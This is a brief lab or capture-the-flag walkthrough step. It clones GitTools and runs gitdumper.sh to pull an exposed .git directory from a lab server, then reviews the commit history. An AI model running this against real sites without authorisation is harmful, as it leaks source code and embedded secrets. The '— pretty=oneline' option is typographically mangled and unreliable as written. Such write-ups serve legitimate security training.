$ git clone https://github.com/internetwache/GitTools

$ cd GitTools/Dumper

then to download the .git directory

./gitdumper.sh http://10.10.28.88/.git/ “Destination_Directory”

and on changing directory to the Destination_Directory

$ git status

$ git log

or for more clear view

$ git log — pretty=oneline
